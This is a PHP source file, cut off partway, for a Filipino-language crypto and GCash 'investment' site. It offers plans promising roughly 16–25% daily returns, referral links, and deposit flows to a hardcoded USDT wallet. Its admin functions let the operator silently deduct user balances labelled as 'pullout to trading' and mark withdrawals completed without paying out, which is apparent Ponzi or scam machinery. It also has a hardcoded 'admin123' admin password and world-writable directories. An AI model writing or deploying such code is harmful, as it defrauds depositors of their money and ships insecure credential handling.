<?php
session_start();

$adminSecretPassword = 'admin123'; 
$dataFile = __DIR__ . '/../data/system_data.json';

// PERMANENT BASE64 INSTAPAY QR CODE
$defaultInstapayQr = 'data:image/jpeg;base64,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';

function loadData($filePath) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) { mkdir($dir, 0777, true); }
    if (!file_exists($filePath)) {
        $initialData = [
            'settings' => ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd', 'qr_image_url' => ''],
            'users' => [],
            'transactions' => []
        ];
        file_put_contents($filePath, json_encode($initialData, JSON_PRETTY_PRINT));
        return $initialData;
    }
    $content = file_get_contents($filePath);
    $data = json_decode($content, true) ?? [];
    if (!isset($data['settings'])) {
        $data['settings'] = ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd', 'qr_image_url' => ''];
    }
    return $data;
}

function saveData($filePath, $data) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) { mkdir($dir, 0777, true); }
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
}

$db = loadData($dataFile);
$adminUsdtWallet = $db['settings']['admin_wallet'] ?? 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd';
$adminQrImageUrl = !empty($db['settings']['qr_image_url']) ? $db['settings']['qr_image_url'] : $defaultInstapayQr;

if (isset($_GET['ref'])) {
    $_SESSION['referred_by'] = htmlspecialchars($_GET['ref']);
}

// Investment Plans
$plans = [
    'Apex-Yield 1' => ['price' => 300, 'return_daily' => 50.00, 'days' => 30],
    'Apex-Yield 2' => ['price' => 700, 'return_daily' => 125.00, 'days' => 30],
    'Apex-Yield 3' => ['price' => 1500, 'return_daily' => 285.00, 'days' => 30],
    'Apex-Yield 4' => ['price' => 3000, 'return_daily' => 600.00, 'days' => 30],
    'Apex-Yield 5' => ['price' => 7000, 'return_daily' => 1500.00, 'days' => 30],
    'Apex-Yield 6' => ['price' => 15000, 'return_daily' => 3430.00, 'days' => 30],
    'Apex-Yield 7' => ['price' => 30000, 'return_daily' => 7370.00, 'days' => 30]
];

// USER REGISTRATION
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'register') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (empty($username) || empty($password)) {
        $authError = "Punan ang username at password.";
    } elseif (isset($db['users'][$username])) {
        $authError = "May gumagamit na ng username na ito.";
    } else {
        $db['users'][$username] = [
            'password' => password_hash($password, PASSWORD_DEFAULT),
            'balance' => 100.00,
            'referred_by' => $_SESSION['referred_by'] ?? 'None',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    }
}

// USER LOGIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (isset($db['users'][$username]) && password_verify($password, $db['users'][$username]['password'])) {
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    } else {
        $authError = "Maling username o password.";
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['user']);
    header("Location: /");
    exit();
}

// ADMIN LOGIN / LOGOUT
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_login') {
    if (trim($_POST['password']) === $adminSecretPassword) {
        $_SESSION['is_admin'] = true;
        header("Location: ?route=admin");
        exit();
    } else {
        $adminError = "Maling password ng admin.";
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'admin_logout') {
    unset($_SESSION['is_admin']);
    header("Location: /");
    exit();
}

// ADMIN SETTINGS UPDATE
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_admin_settings') {
    $newWallet = trim($_POST['new_admin_wallet'] ?? '');
    if (!empty($newWallet)) {
        $db['settings']['admin_wallet'] = htmlspecialchars($newWallet);
        $adminUsdtWallet = $newWallet;
    }
    saveData($dataFile, $db);
    $adminSuccess = "Matagumpay na na-update ang Admin Settings!";
}

// ADMIN DIRECT FUND ADJUSTMENT
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_adjust_fund') {
    $targetUser = trim($_POST['target_user'] ?? '');
    $adjustAmount = floatval($_POST['adjust_amount'] ?? 0);
    $type = $_POST['adjust_type'] ?? 'pullout';

    if (isset($db['users'][$targetUser]) && $adjustAmount > 0) {
        if ($type === 'pullout') {
            $db['users'][$targetUser]['balance'] -= $adjustAmount;
            if ($db['users'][$targetUser]['balance'] < 0) { $db['users'][$targetUser]['balance'] = 0; }
            $db['transactions'][] = [
                'id' => 'TRD-PULL-' . time(),
                'username' => $targetUser,
                'type' => 'pullout_to_trading',
                'amount' => $adjustAmount,
                'status' => 'completed',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Na-pullout ang ₱" . number_format($adjustAmount, 2) . " kay $targetUser para i-roll sa trading account!";
        } elseif ($type === 'deposit') {
            $db['users'][$targetUser]['balance'] += $adjustAmount;
            $db['transactions'][] = [
                'id' => 'ADM-DEP-' . time(),
                'username' => $targetUser,
                'type' => 'admin_deposit',
                'amount' => $adjustAmount,
                'status' => 'approved',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Nalagyan ng ₱" . number_format($adjustAmount, 2) . " si $targetUser!";
        }
        saveData($dataFile, $db);
    } else {
        $adminErrorMsg = "Mali ang napiling user o halaga.";
    }
}

// ADMIN APPROVALS
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_deposit'])) {
    $txnId = $_GET['approve_deposit'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'approved';
            $u = $txn['username'];
            if (isset($db['users'][$u])) {
                $db['users'][$u]['balance'] += $txn['amount'];
            }
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_withdraw'])) {
    $txnId = $_GET['approve_withdraw'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'completed';
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

// CURRENT USER
$currentUser = $_SESSION['user'] ?? null;
$userData = $currentUser ? ($db['users'][$currentUser] ?? null) : null;
$referralLink = $currentUser ? ('http://' . $_SERVER['HTTP_HOST'] . '/?ref=' . $currentUser) : '';

// USER RECHARGE SUBMISSION
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'submit_recharge') {
    $amount = floatval($_POST['deposit_amount'] ?? 0);
    $method = $_POST['payment_method'] ?? 'GCash';

    if ($amount < 300) {
        $error = "Ang minimum recharge ay ₱300.";
    } else {
        $txnId = 'PAY-' . time();
        $db['transactions'][] = [
            'id' => $txnId,
            'username' => $currentUser,
            'type' => 'recharge_' . strtolower($method),
            'amount' => $amount,
            'txid' => 'GATEWAY-PENDING-' . time(),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        header("Location: ?route=gateway&txn=" . $txnId . "&amount=" . $amount . "&method=" . $method);
        exit();
    }
}

// USER WITHDRAWAL
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'request_withdraw') {
    $amount = floatval($_POST['withdraw_amount'] ?? 0);
    $wallet = trim($_POST['user_wallet'] ?? '');
    $currentBalance = $userData['balance'] ?? 0;

    if ($amount < 100) {
        $error = "Ang minimum withdrawal ay ₱100.";
    } elseif ($amount > $currentBalance) {
        $error = "Hindi sapat ang iyong balance.";
    } elseif (empty($wallet)) {
        $error = "Ilagay ang iyong GCash / Wallet details.";
    } else {
        $db['users'][$currentUser]['balance'] -= $amount;
        $db['transactions'][] = [
            'id' => 'WD-' . time(),
            'username' => $currentUser,
            'type' => 'withdraw',
            'amount' => $amount,
            'wallet' => htmlspecialchars($wallet),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $userData = $db['users'][$currentUser];
        $success = "Naisumite na ang withdrawal request!";
    }
}

// SUBSCRIBE PLAN
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'subscribe') {
    $planKey = $_POST['plan_name'] ?? '';
    if (isset($plans[$planKey])) {
        $plan = $plans[$planKey];
        if ($userData['balance'] < $plan['price']) {
            $error = "Hindi sapat ang iyong balance para sa plan na ito.";
        } else {
            $db['users'][$currentUser]['balance'] -= $plan['price'];
            $db['transactions'][] = [
                'id' => 'SUB-' . time(),
                'username' => $currentUser,
                'type' => 'subscription',
                'plan' => $planKey,
                'amount' => $plan['price'],
                'status' => 'active',
                'created_at' => date('Y-m-d H:i:s')
            ];
